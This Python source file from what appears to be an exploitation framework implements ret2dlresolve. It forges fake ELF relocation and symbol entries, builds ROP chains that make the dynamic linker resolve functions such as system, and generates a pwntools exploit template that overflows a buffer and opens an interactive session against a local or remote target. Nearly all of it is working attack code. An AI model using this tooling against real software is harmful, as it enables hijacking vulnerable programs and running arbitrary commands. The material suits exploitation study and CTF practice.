"""
Enhanced ret2dlresolve exploitation.

Implements ret2dlresolve without relying solely on pwntools,
with support for both 32-bit and 64-bit binaries.

Technique overview:
1. Forge fake Elf_Rel/Elf_Rela entries
2. Forge fake Elf_Sym entries
3. Create string for function name
4. Call PLT[0] with reloc_index pointing to fake structures
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32, u64, u32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class ElfDynamic:
    """Dynamic section entries for ret2dlresolve."""
    jmprel: int = 0      # DT_JMPREL - PLT relocations
    symtab: int = 0      # DT_SYMTAB - Symbol table
    strtab: int = 0      # DT_STRTAB - String table
    pltgot: int = 0      # DT_PLTGOT - GOT address
    relent: int = 0      # DT_RELENT/DT_RELAENT - Relocation entry size
    syment: int = 24     # DT_SYMENT - Symbol entry size (24 for 64-bit, 16 for 32-bit)


@dataclass
class Ret2dlresolvePayload:
    """
    Complete ret2dlresolve payload data.

    Contains:
    - Fake relocation entry
    - Fake symbol entry
    - Function name string
    - Data address where payload should be written
    """
    payload: bytes = b""
    data_addr: int = 0
    reloc_index: int = 0
    plt0_addr: int = 0

    # Individual components
    fake_rel: bytes = b""
    fake_sym: bytes = b""
    func_name: bytes = b""


class Ret2dlresolve:
    """
    Manual ret2dlresolve implementation.

    Works by:
    1. Finding a writable area (usually .bss or after .data)
    2. Creating fake ELF structures pointing to desired function
    3. Calling PLT[0] which invokes the dynamic linker
    4. Dynamic linker resolves our fake symbol = arbitrary function call
    """

    def __init__(self, binary, bits: int = 64):
        """
        Initialize ret2dlresolve.

        Args:
            binary: Binary object or pwntools ELF
            bits: Architecture bits (32 or 64)
        """
        self.binary = binary
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.unpack = u64 if bits == 64 else u32
        self.ptr_size = 8 if bits == 64 else 4

        # ELF structure sizes
        self.rel_size = 24 if bits == 64 else 8    # Elf64_Rela vs Elf32_Rel
        self.sym_size = 24 if bits == 64 else 16   # Elf64_Sym vs Elf32_Sym

        # Extract dynamic info
        self.dyn = self._parse_dynamic()

    def _parse_dynamic(self) -> ElfDynamic:
        """Parse dynamic section to get necessary addresses."""
        dyn = ElfDynamic()

        try:
            # Try pwntools ELF attributes
            if hasattr(self.binary, 'get_section_by_name'):
                # Has pyelftools-style interface
                pass

            if hasattr(self.binary, '_elf'):
                elf = self.binary._elf
            else:
                elf = self.binary

            # Get addresses from dynamic section
            if hasattr(elf, 'dynamic_value_by_tag'):
                dyn.jmprel = elf.dynamic_value_by_tag('DT_JMPREL') or 0
                dyn.symtab = elf.dynamic_value_by_tag('DT_SYMTAB') or 0
                dyn.strtab = elf.dynamic_value_by_tag('DT_STRTAB') or 0
                dyn.pltgot = elf.dynamic_value_by_tag('DT_PLTGOT') or 0

                if self.bits == 64:
                    dyn.relent = elf.dynamic_value_by_tag('DT_RELAENT') or 24
                else:
                    dyn.relent = elf.dynamic_value_by_tag('DT_RELENT') or 8

                dyn.syment = elf.dynamic_value_by_tag('DT_SYMENT') or self.sym_size

            # Fallback: try section addresses
            if not dyn.jmprel and hasattr(elf, 'sections'):
                for section in elf.sections:
                    name = section.name if hasattr(section, 'name') else ''
                    if '.rela.plt' in name or '.rel.plt' in name:
                        dyn.jmprel = section.header.sh_addr if hasattr(section, 'header') else 0
                    elif '.dynsym' in name:
                        dyn.symtab = section.header.sh_addr if hasattr(section, 'header') else 0
                    elif '.dynstr' in name:
                        dyn.strtab = section.header.sh_addr if hasattr(section, 'header') else 0

        except Exception as e:
            logger.debug(f"Error parsing dynamic section: {e}")

        return dyn

    def _find_writable_area(self) -> int:
        """Find suitable writable area for fake structures."""
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Prefer .bss section
            if hasattr(elf, 'bss'):
                return elf.bss + 0x100  # Offset to avoid overwriting important data

            # Try to find .bss manually
            if hasattr(elf, 'get_section_by_name'):
                bss = elf.get_section_by_name('.bss')
                if bss:
                    return bss.header.sh_addr + 0x100

            # Fallback: use address after .data
            if hasattr(elf, 'get_section_by_name'):
                data = elf.get_section_by_name('.data')
                if data:
                    return data.header.sh_addr + data.header.sh_size + 0x100

        except Exception as e:
            logger.debug(f"Error finding writable area: {e}")

        # Last resort: common .bss locations
        return 0x601000 + 0x800 if self.bits == 64 else 0x804b000 + 0x800

    def build_payload(
        self,
        func_name: str,
        data_addr: Optional[int] = None,
        args: Optional[List[int]] = None,
    ) -> Ret2dlresolvePayload:
        """
        Build ret2dlresolve payload structures.

        Args:
            func_name: Function to resolve (e.g., "system")
            data_addr: Address to place fake structures (auto-detected if None)
            args: Function arguments

        Returns:
            Ret2dlresolvePayload with all components
        """
        if data_addr is None:
            data_addr = self._find_writable_area()

        result = Ret2dlresolvePayload()
        result.data_addr = data_addr

        func_name_bytes = func_name.encode() + b'\x00'

        if self.bits == 64:
            result = self._build_64bit_payload(data_addr, func_name_bytes)
        else:
            result = self._build_32bit_payload(data_addr, func_name_bytes)

        return result

    def _build_32bit_payload(
        self,
        data_addr: int,
        func_name: bytes,
    ) -> Ret2dlresolvePayload:
        """Build 32-bit ret2dlresolve payload."""
        result = Ret2dlresolvePayload()
        result.data_addr = data_addr

        # Layout in memory:
        # data_addr + 0x00: Elf32_Rel (8 bytes)
        # data_addr + 0x08: Elf32_Sym (16 bytes)
        # data_addr + 0x18: function name string

        fake_rel_addr = data_addr
        fake_sym_addr = data_addr + 8
        str_addr = data_addr + 8 + 16

        # Calculate reloc_index
        # reloc_index = (fake_rel_addr - JMPREL) / sizeof(Elf32_Rel)
        reloc_index = (fake_rel_addr - self.dyn.jmprel) // 8
        result.reloc_index = reloc_index

        # Calculate symbol index
        # sym_index = (fake_sym_addr - SYMTAB) / sizeof(Elf32_Sym)
        sym_index = (fake_sym_addr - self.dyn.symtab) // 16

        # Calculate string offset
        # st_name = str_addr - STRTAB
        st_name = str_addr - self.dyn.strtab

        # Build Elf32_Rel
        # typedef struct {
        #     Elf32_Addr r_offset;  // GOT entry address (doesn't matter for resolve)
        #     Elf32_Word r_info;    // (sym_index << 8) | R_386_JMP_SLOT
        # } Elf32_Rel;
        R_386_JMP_SLOT = 7
        r_offset = self.dyn.pltgot + 0x20  # Some GOT entry
        r_info = (sym_index << 8) | R_386_JMP_SLOT

        fake_rel = p32(r_offset) + p32(r_info)
        result.fake_rel = fake_rel

        # Build Elf32_Sym
        # typedef struct {
        #     Elf32_Word    st_name;   // String table offset
        #     Elf32_Addr    st_value;  // Symbol value
        #     Elf32_Word    st_size;   // Symbol size
        #     unsigned char st_info;   // Type and binding
        #     unsigned char st_other;  // Visibility
        #     Elf32_Section st_shndx;  // Section index
        # } Elf32_Sym;

        fake_sym = p32(st_name)     # st_name
        fake_sym += p32(0)          # st_value
        fake_sym += p32(0)          # st_size
        fake_sym += bytes([0x12])   # st_info = STB_GLOBAL | STT_FUNC
        fake_sym += bytes([0])      # st_other
        fake_sym += p32(0)[:2]      # st_shndx = SHN_UNDEF

        result.fake_sym = fake_sym
        result.func_name = func_name

        # Combine payload
        result.payload = fake_rel + fake_sym + func_name

        # Get PLT[0]
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary
            if hasattr(elf, 'get_section_by_name'):
                plt = elf.get_section_by_name('.plt')
                if plt:
                    result.plt0_addr = plt.header.sh_addr
        except Exception:
            pass

        return result

    def _build_64bit_payload(
        self,
        data_addr: int,
        func_name: bytes,
    ) -> Ret2dlresolvePayload:
        """
        Build 64-bit ret2dlresolve payload.

        64-bit is more complex due to:
        1. RELRO might be full (blocks this technique)
        2. Uses Elf64_Rela with addend
        3. Version checking can interfere
        """
        result = Ret2dlresolvePayload()
        result.data_addr = data_addr

        # Layout:
        # data_addr + 0x00: Elf64_Rela (24 bytes)
        # data_addr + 0x18: Elf64_Sym (24 bytes)
        # data_addr + 0x30: function name string
        # data_addr + 0x40: padding/alignment

        fake_rel_addr = data_addr
        fake_sym_addr = data_addr + 24
        str_addr = data_addr + 48

        # Calculate indices
        # For 64-bit, we might need to handle RELRO and other mitigations
        reloc_index = (fake_rel_addr - self.dyn.jmprel) // 24
        result.reloc_index = reloc_index

        sym_index = (fake_sym_addr - self.dyn.symtab) // 24
        st_name = str_addr - self.dyn.strtab

        # Build Elf64_Rela
        # typedef struct {
        #     Elf64_Addr   r_offset;  // Address
        #     Elf64_Xword  r_info;    // Relocation type and symbol index
        #     Elf64_Sxword r_addend;  // Addend
        # } Elf64_Rela;
        R_X86_64_JUMP_SLOT = 7
        r_offset = self.dyn.pltgot + 0x30
        r_info = (sym_index << 32) | R_X86_64_JUMP_SLOT
        r_addend = 0

        fake_rel = p64(r_offset) + p64(r_info) + p64(r_addend)
        result.fake_rel = fake_rel

        # Build Elf64_Sym
        # typedef struct {
        #     Elf64_Word    st_name;   // Symbol name (string tbl index)
        #     unsigned char st_info;   // Symbol type and binding
        #     unsigned char st_other;  // Symbol visibility
        #     Elf64_Section st_shndx;  // Section index
        #     Elf64_Addr    st_value;  // Symbol value
        #     Elf64_Xword   st_size;   // Symbol size
        # } Elf64_Sym;

        fake_sym = p32(st_name & 0xffffffff)  # st_name (truncated to 32-bit)
        fake_sym += bytes([0x12])              # st_info = STB_GLOBAL | STT_FUNC
        fake_sym += bytes([0])                 # st_other
        fake_sym += p32(0)[:2]                 # st_shndx
        fake_sym += p64(0)                     # st_value
        fake_sym += p64(0)                     # st_size

        result.fake_sym = fake_sym
        result.func_name = func_name

        # Combine payload
        result.payload = fake_rel + fake_sym + func_name

        # Get PLT[0]
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary
            if hasattr(elf, 'get_section_by_name'):
                plt = elf.get_section_by_name('.plt')
                if plt:
                    result.plt0_addr = plt.header.sh_addr
        except Exception:
            pass

        return result

    def can_use_technique(self) -> Tuple[bool, str]:
        """
        Check if ret2dlresolve is feasible.

        Returns:
            Tuple of (feasible, reason)
        """
        try:
            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary

            # Check for Full RELRO
            if hasattr(elf, 'relro'):
                if elf.relro == 'Full':
                    return False, "Full RELRO enabled - GOT is read-only"

            # Check for required sections
            if not self.dyn.jmprel:
                return False, "No .rel.plt/.rela.plt section found"
            if not self.dyn.symtab:
                return False, "No .dynsym section found"
            if not self.dyn.strtab:
                return False, "No .dynstr section found"

            # Check for writable area
            writable = self._find_writable_area()
            if not writable:
                return False, "No suitable writable area found"

            return True, "ret2dlresolve is feasible"

        except Exception as e:
            return False, f"Error checking feasibility: {e}"

    def generate_rop_chain(
        self,
        func_name: str,
        args: List[int],
        read_primitive: Optional[Tuple[int, int]] = None,
    ) -> Dict[str, Any]:
        """
        Generate complete ROP chain for ret2dlresolve.

        Args:
            func_name: Function to call
            args: Function arguments
            read_primitive: Optional (read_plt, read_got) for writing payload

        Returns:
            Dict with chain and payload info
        """
        result = {
            "feasible": False,
            "reason": "",
            "chain": b"",
            "payload": b"",
            "data_addr": 0,
            "steps": [],
        }

        feasible, reason = self.can_use_technique()
        result["feasible"] = feasible
        result["reason"] = reason

        if not feasible:
            return result

        # Build payload
        payload = self.build_payload(func_name)
        result["payload"] = payload.payload
        result["data_addr"] = payload.data_addr

        # Try to use pwntools for chain building
        try:
            from pwn import ROP, Ret2dlresolvePayload as PWNRet2dl, context

            elf = self.binary._elf if hasattr(self.binary, '_elf') else self.binary
            context.binary = elf

            # Use pwntools' implementation
            dlresolve = PWNRet2dl(elf, symbol=func_name, args=args)
            rop = ROP(elf)

            # Add read to write payload if we have it
            if read_primitive:
                rop.call('read', [0, dlresolve.data_addr, len(dlresolve.payload)])

            rop.ret2dlresolve(dlresolve)

            result["chain"] = rop.chain()
            result["payload"] = dlresolve.payload
            result["data_addr"] = dlresolve.data_addr
            result["steps"] = [
                f"1. Write payload ({len(dlresolve.payload)} bytes) to 0x{dlresolve.data_addr:x}",
                f"2. Call PLT[0] with reloc_index pointing to fake structures",
                f"3. Dynamic linker resolves '{func_name}' using our fake symbol",
                f"4. '{func_name}' gets called with args: {args}",
            ]

            return result

        except ImportError:
            logger.warning("pwntools not available, returning manual payload")

        except Exception as e:
            logger.debug(f"pwntools ret2dlresolve failed: {e}")

        # Manual chain building
        result["steps"] = [
            f"1. Write {len(payload.payload)} bytes to 0x{payload.data_addr:x}",
            f"2. Build ROP chain to call PLT[0] with index {payload.reloc_index}",
            f"3. Set up arguments for '{func_name}': {args}",
        ]

        return result

    def generate_exploit_code(
        self,
        func_name: str,
        args: List[int],
    ) -> str:
        """
        Generate Python exploit code snippet.

        Args:
            func_name: Function to resolve
            args: Function arguments

        Returns:
            Python code string
        """
        return f'''
# ret2dlresolve exploit
from pwn import *

# Load binary
elf = ELF('./binary')
context.binary = elf

# Create ret2dlresolve payload
dlresolve = Ret2dlresolvePayload(elf, symbol="{func_name}", args={args})

# Build ROP chain
rop = ROP(elf)

# Need a way to write the payload to memory first
# Option 1: If we have read() in PLT
if 'read' in elf.plt:
    rop.call('read', [0, dlresolve.data_addr, len(dlresolve.payload)])

# Option 2: Direct write if we have arbitrary write primitive
# edit(dlresolve.data_addr, dlresolve.payload)

# Trigger the resolve
rop.ret2dlresolve(dlresolve)

# Send exploit
p = process('./binary')
# p = remote('host', port)

# Send ROP chain as overflow payload
payload = b'A' * offset  # Adjust offset
payload += rop.chain()
p.sendline(payload)

# Send dlresolve data (if using read())
p.send(dlresolve.payload)

p.interactive()
'''

    def summary(self) -> str:
        """Get technique summary."""
        feasible, reason = self.can_use_technique()

        return f"""
ret2dlresolve Analysis
======================
Architecture: {self.bits}-bit
Feasible: {feasible}
Reason: {reason}

Dynamic Section:
  JMPREL:  0x{self.dyn.jmprel:x}
  SYMTAB:  0x{self.dyn.symtab:x}
  STRTAB:  0x{self.dyn.strtab:x}
  PLTGOT:  0x{self.dyn.pltgot:x}

Writable area: 0x{self._find_writable_area():x}

Usage:
  resolver = Ret2dlresolve(binary)
  payload = resolver.build_payload("system")
  chain = resolver.generate_rop_chain("system", [cmd_addr])
"""
